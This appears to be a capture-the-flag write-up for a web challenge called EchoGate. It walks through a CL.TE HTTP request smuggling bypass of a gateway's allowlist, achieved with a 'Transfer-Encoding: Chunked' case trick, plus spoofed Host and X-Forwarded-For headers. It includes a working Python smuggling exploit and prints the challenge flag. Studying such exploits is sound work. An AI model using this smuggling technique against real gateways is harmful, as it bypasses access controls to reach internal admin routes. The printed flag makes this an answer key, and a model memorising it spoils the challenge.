---
title: "EchoGate"
category: "Web"
tags: ["web", "http-request-smuggling", "cl-te", "transfer-encoding", "gateway-bypass", "xff"]
solve_date: "2026-11-02T13:29:13+07:00"
language: "en"
points: 132
---

# EchoGate — `Transfer-Encoding: Chunked` case bug to CL.TE smuggling

**Flag:** `CTF{12de61a5e5def6eb9d565836bd461566}`
**Service:** `http://169.58.126.107:3005`
**Flag format:** `CTF{...}`

## Challenge

> EchoGate — 132 points. EchoGate is a small internal API gateway: a public-facing proxy in front of a backend service that nobody is supposed to reach directly. The gateway only lets a narrow set of public routes through. Everything else is somebody else's problem.

The gateway exposes a small allowlisted public surface. The backend behind it has an `/admin/flag` route that should only be reachable from an internal origin.

## Analysis

### Gateway routing

The front proxy only allows requests whose raw request-target starts with `/api/`. The backend router, however, matches the raw target exactly, so the only reachable public route is:

```text
POST /api/echo
```

It echoes the request body. A query string on the same path reaches the router as a different target and returns 404. The gateway rate-limits bursts at roughly 20 requests, refilling about one request every three seconds.

### The framing bug

The gateway correctly rejects requests that carry both `Transfer-Encoding` and `Content-Length` with:

```text
400 ambiguous framing
```

The check is case-sensitive on the value: it looks for exactly `chunked`. Sending:

```http
Transfer-Encoding: Chunked
```

passes the gateway's check, while the backend's HTTP parser treats the value case-insensitively and switches to chunked framing. That is a CL.TE desync:

- the front proxy reads the body according to `Content-Length`;
- the backend reads it as chunked, stops at the `0\r\n\r\n` terminator;
- everything after the terminator is parsed by the backend as a second HTTP request, bypassing the gateway's allowlist.

### Reaching the admin route

Smuggling a direct `GET /admin/flag` reaches the backend but returns:

```text
403 admin access requires internal origin
```

The origin check trusts `Host` and `X-Forwarded-For`. Adding both to the smuggled request satisfies it:

```http
GET /admin/flag HTTP/1.1
Host: localhost
X-Forwarded-For: 127.0.0.1
```

The backend then returns `200 OK` with the flag.

## Exploit

```python
import socket

HOST, PORT = "169.58.126.107", 3005

smuggled = (
    b"GET /admin/flag HTTP/1.1\r\n"
    b"Host: localhost\r\n"
    b"X-Forwarded-For: 127.0.0.1\r\n"
    b"\r\n"
)

body = b"0\r\n\r\n" + smuggled

request = (
    b"POST /api/echo HTTP/1.1\r\n"
    b"Host: 169.58.126.107:3005\r\n"
    b"Content-Type: application/x-www-form-urlencoded\r\n"
    b"Transfer-Encoding: Chunked\r\n"
    + b"Content-Length: " + str(len(body)).encode() + b"\r\n"
    b"Connection: keep-alive\r\n"
    b"\r\n"
    + body
)

s = socket.create_connection((HOST, PORT), timeout=10)
s.sendall(request)

out = b""
while True:
    chunk = s.recv(4096)
    if not chunk:
        break
    out += chunk
print(out.decode(errors="replace"))
```

The second response on the connection is the backend's answer to the smuggled request:

```text
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Content-Length: 38

CTF{12de61a5e5def6eb9d565836bd461566}
```

## Notes

- The gateway's ambiguity check is a string comparison, not a parse: `chunked` (lowercase) is rejected, `Chunked` is accepted and then normalised by the backend.
- The allowlist is enforced on the raw request-target at the front proxy. A request that the backend parses out of the smuggled body never passes through that check.
- The admin route's origin check is header-based (`Host` and `X-Forwarded-For`). A smuggled request can set both because it is constructed locally, not rewritten by the gateway.
- The rate limit is per-IP and bursty; one request is enough once the payload is correct, so the limit only matters during route discovery.

## References

- HTTP request smuggling, CL.TE desync
- CWE-444 — Inconsistent Interpretation of HTTP Requests
